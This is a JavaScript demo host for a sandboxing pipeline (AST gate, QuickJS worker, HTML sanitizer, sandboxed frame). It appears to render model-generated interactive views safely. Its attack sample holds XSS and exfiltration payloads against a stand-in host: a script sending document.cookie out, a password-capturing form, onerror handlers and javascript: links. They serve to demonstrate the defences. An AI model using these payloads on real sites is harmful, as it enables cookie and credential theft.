// Demo host application. Wires together: AST gate -> QuickJS worker runtime
// -> view string -> inert parse -> policy -> structured tree -> sandboxed frame.
import manifest from "../dist/frame-manifest.js";
import { setClassAllowlist, checkTree } from "../src/policy.js";
import { parseHtmlToRaw } from "../src/adapters/dom.js";
import { createSandboxFrame } from "../src/host.js";
import { createRuntimeController } from "../src/runtime/controller.js";
import { gateProgram } from "../src/gate.js";

setClassAllowlist(manifest.classes);

const $ = (id) => document.getElementById(id);
const statusEl = $("status");
const reportEl = $("report");

function setStatus(text, bad = false) {
  statusEl.textContent = text;
  statusEl.classList.toggle("bad", bad);
}

function report(lines) {
  reportEl.textContent = lines.join("\n");
}

let frame = null;
let runtime = null;

// View string -> validated tree, or null with reasons reported.
function validateView(html, label, lines) {
  const raw = parseHtmlToRaw(html, DOMParser);
  const result = checkTree(raw);
  if (result.status !== "validated") {
    lines.push(`${label}: REJECTED ${JSON.stringify(result.reasons)}`);
    return null;
  }
  lines.push(`${label}: validated, ${result.changes.length} change(s)`);
  for (const c of result.changes.slice(0, 40)) lines.push("  - " + describeChange(c));
  if (result.changes.length > 40) lines.push(`  ... ${result.changes.length - 40} more`);
  return result.tree;
}

function describeChange(c) {
  const where = c.path ? ` at ${c.path.join("/")}` : "";
  switch (c.kind) {
    case "removed-element": return `removed <${c.tag}>${c.ns ? ` (${c.ns})` : ""}${c.why ? ` [${c.why}]` : ""}${where}`;
    case "unwrapped-element": return `unwrapped <${c.tag}>${where}`;
    case "removed-attribute": return `removed ${c.tag}[${c.name}]${c.why ? ` [${c.why}]` : ""}${where}`;
    case "rewrote-attribute": return `rewrote ${c.tag}[${c.name}]${where}`;
    case "removed-node": return `removed ${c.what}${where}`;
    default: return JSON.stringify(c);
  }
}

async function run() {
  const lines = [];
  if (runtime) runtime.dispose();
  runtime = null;
  if (!frame) {
    frame = createSandboxFrame({
      container: $("frame-container"),
      manifest,
      onStatus: ({ kind, detail }) => {
        if (kind === "refused") setStatus(`frame refused update: ${detail}`, true);
      },
      onEvent: handleEvent,
    });
  }

  const html = $("html").value;
  const js = $("js").value.trim();

  const tree = validateView(html, "initial HTML", lines);
  if (tree) await frame.render(tree);
  else frame.clear();

  if (!js) {
    setStatus("static document rendered");
    report(lines);
    return;
  }

  const gate = gateProgram(js);
  if (gate.status !== "eligible-for-restricted-execution") {
    lines.push("AST gate: REJECTED (returned for regeneration)");
    for (const r of gate.reasons) lines.push(`  - ${r.code}${r.line ? ` @${r.line}:${r.column}` : ""} ${r.message ?? r.name ?? ""}`);
    setStatus("interaction source rejected by AST gate; static document kept", true);
    report(lines);
    return;
  }
  lines.push("AST gate: eligible for restricted execution");

  runtime = createRuntimeController({
    createWorker: () => new Worker("/dist/worker.js"),
    onDead: (reason) => { if (reason !== "disposed") setStatus(`runtime stopped: ${reason}. Last validated view retained.`, true); },
  });
  try {
    const t0 = performance.now();
    const { view } = await runtime.load(gate.program.source, HOST_DATA);
    lines.push(`runtime: loaded and initialized in ${(performance.now() - t0).toFixed(1)} ms`);
    const viewTree = validateView(view, "initial view", lines);
    if (viewTree) {
      await frame.render(viewTree);
      setStatus("interactive: running in QuickJS worker, rendering in sandboxed frame");
    } else {
      setStatus("initial view rejected; static document kept", true);
    }
  } catch (err) {
    lines.push(`runtime error: ${err.message}`);
  }
  report(lines);
}

let eventCount = 0;
async function handleEvent(ev) {
  if (!runtime || runtime.dead) return;
  eventCount++;
  try {
    const t0 = performance.now();
    const { view } = await runtime.step(ev);
    const lines = [`event #${eventCount}: ${JSON.stringify(ev)} -> ${(performance.now() - t0).toFixed(1)} ms in runtime`];
    const tree = validateView(view, "view", lines);
    if (tree) await frame.render(tree);
    report(lines);
  } catch (err) {
    if (err.message !== "event queue full") report([`event failed: ${err.message}`]);
  }
}

// ---------------------------------------------------------------------------
// Samples

const BENIGN_HTML = `<div class="card stack">
  <h2 class="title">Quarterly revenue</h2>
  <p class="muted small">Static document shown until the interaction program initializes.</p>
</div>`;

// Host-owned dataset. It is injected into the runtime as a frozen global named
// `data` and never passes through model output.
const HOST_DATA = [
  { region: "North", q1: 120, q2: 150, q3: 170, q4: 210 },
  { region: "South", q1: 90, q2: 95, q3: 130, q4: 160 },
  { region: "East", q1: 200, q2: 180, q3: 190, q4: 230 },
  { region: "West", q1: 60, q2: 80, q3: 85, q4: 120 },
];

const BENIGN_JS = `// \`data\` is supplied by the host: an array of { region, q1, q2, q3, q4 }.
const initialState = { tab: "chart", quarter: "q4", sortKey: "region", sortDir: 1, filter: "", hover: null, count: 0 };

function update(state, event) {
  switch (event.action) {
    case "tab": return { ...state, tab: event.dataValue };
    case "quarter": return { ...state, quarter: event.value };
    case "sort": {
      const dir = state.sortKey === event.dataValue ? -state.sortDir : 1;
      return { ...state, sortKey: event.dataValue, sortDir: dir };
    }
    case "filter": return { ...state, filter: event.value || "" };
    case "hover": return { ...state, hover: event.type === "pointerleave" ? null : event.dataValue };
    case "increment": return event.type === "click" ? { ...state, count: state.count + 1 } : state;
    default: return state;
  }
}

function esc(s) {
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/"/g, "&quot;");
}

function rows(state) {
  const f = state.filter.toLowerCase();
  return data
    .filter((r) => r.region.toLowerCase().includes(f))
    .sort((a, b) => (a[state.sortKey] > b[state.sortKey] ? 1 : -1) * state.sortDir);
}

function chart(state) {
  const rs = rows(state);
  const max = Math.max(1, ...rs.map((r) => r[state.quarter]));
  const barW = 60, gap = 20, h = 160, left = 30;
  const width = left + rs.length * (barW + gap);
  const bars = rs.map((r, i) => {
    const bh = Math.round((r[state.quarter] / max) * (h - 30));
    const x = left + i * (barW + gap);
    const hovered = state.hover === r.region;
    return \`<g data-action="hover" data-hover data-value="\${esc(r.region)}">
      <rect class="\${hovered ? "bar-alt" : "bar"}" x="\${x}" y="\${h - bh - 20}" width="\${barW}" height="\${bh}" rx="3"></rect>
      <text class="label" x="\${x + barW / 2}" y="\${h - 6}" text-anchor="middle">\${esc(r.region)}</text>
      <text class="label" x="\${x + barW / 2}" y="\${h - bh - 26}" text-anchor="middle">\${r[state.quarter]}</text>
    </g>\`;
  }).join("");
  return \`<svg class="chart" viewBox="0 0 \${width} \${h}" role="img" aria-label="Revenue by region">
    <line class="axis" x1="\${left - 5}" y1="\${h - 20}" x2="\${width}" y2="\${h - 20}"></line>\${bars}</svg>
    <div class="row small muted">\${state.hover ? \`<span class="tooltip">\${esc(state.hover)}: \${rows(state).find((r) => r.region === state.hover)?.[state.quarter] ?? ""}</span>\` : "Hover a bar"}</div>\`;
}

function table(state) {
  const th = (k, label) => \`<th data-action="sort" data-value="\${k}" aria-sort="\${state.sortKey === k ? (state.sortDir > 0 ? "ascending" : "descending") : "none"}">\${label}</th>\`;
  return \`<table class="table"><thead><tr>\${th("region", "Region")}\${th("q1", "Q1")}\${th("q2", "Q2")}\${th("q3", "Q3")}\${th("q4", "Q4")}</tr></thead><tbody>
    \${rows(state).map((r) => \`<tr><td>\${esc(r.region)}</td><td class="right">\${r.q1}</td><td class="right">\${r.q2}</td><td class="right">\${r.q3}</td><td class="right">\${r.q4}</td></tr>\`).join("")}
  </tbody></table>\`;
}

function view(state) {
  return \`<div class="card stack">
    <h2 class="title">Quarterly revenue</h2>
    <div class="tabs">
      <button class="tab \${state.tab === "chart" ? "tab-active" : ""}" data-action="tab" data-value="chart">Chart</button>
      <button class="tab \${state.tab === "table" ? "tab-active" : ""}" data-action="tab" data-value="table">Table</button>
    </div>
    <div class="row">
      <label for="filter">Filter</label>
      <input id="filter" class="input" data-action="filter" value="\${esc(state.filter)}" placeholder="region">
      <label for="quarter">Quarter</label>
      <select id="quarter" class="input" data-action="quarter">
        \${["q1", "q2", "q3", "q4"].map((q) => \`<option value="\${q}" \${state.quarter === q ? "selected" : ""}>\${q.toUpperCase()}</option>\`).join("")}
      </select>
      <span class="grow"></span>
      <button class="btn" data-action="increment">Clicked \${state.count}</button>
    </div>
    \${state.tab === "chart" ? chart(state) : table(state)}
  </div>\`;
}`;

const ATTACK_HTML = `<div class="card" id="root" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">
  <h2 class="title" onclick="alert(1)">Attack sample</h2>
  <script>fetch("https://example.invalid/exfil?" + document.cookie)</script>
  <img src="https://example.invalid/pixel.gif">
  <a href="https://example.invalid/phish" target="_blank">Click me</a>
  <form action="https://example.invalid/post" method="post"><input type="password" name="pw" autocomplete="current-password"><button>Submit</button></form>
  <iframe src="https://example.invalid/"></iframe>
  <math><mi xlink:href="data:x,<script>alert(1)</script>">x</mi></math>
  <svg><use href="#x"></use><image href="https://example.invalid/i.svg"></image><foreignObject><img src=x onerror="alert(2)"></foreignObject><desc><img src=x onerror="alert(3)"></desc><rect fill="url(https://example.invalid/p.svg#g)" width="1e999" height="10"></rect><animate attributeName="x" to="1"></animate><a href="javascript:alert(4)"><text x="10" y="20">svg link</text></a></svg>
  <style>@import url(https://example.invalid/c.css)</style>
  <p title="ok" class="muted evil-class">Visible text with bidi \u202E override and <b>bold</b></p>
  <details open ontoggle="alert(5)"><summary>Summary</summary></details>
  <input type="text" accesskey="x" autofocus tabindex="5" contenteditable>
</div>`;

const ATTACK_JS = `const initialState = { n: 0 };
function update(state, event) {
  // Each of these is either unavailable in QuickJS or rejected by the AST gate.
  fetch("https://example.invalid/x");
  return { n: state.n + 1 };
}
function view(state) {
  return '<img src="https://example.invalid/leak?' + state.n + '"><script>alert(1)</script><p onclick="alert(2)">n=' + state.n + '</p>';
}`;

$("benign").addEventListener("click", () => { $("html").value = BENIGN_HTML; $("js").value = BENIGN_JS; run(); });
$("attack").addEventListener("click", () => { $("html").value = ATTACK_HTML; $("js").value = ATTACK_JS; run(); });
$("run").addEventListener("click", run);
$("html").value = BENIGN_HTML;
$("js").value = BENIGN_JS;
run();
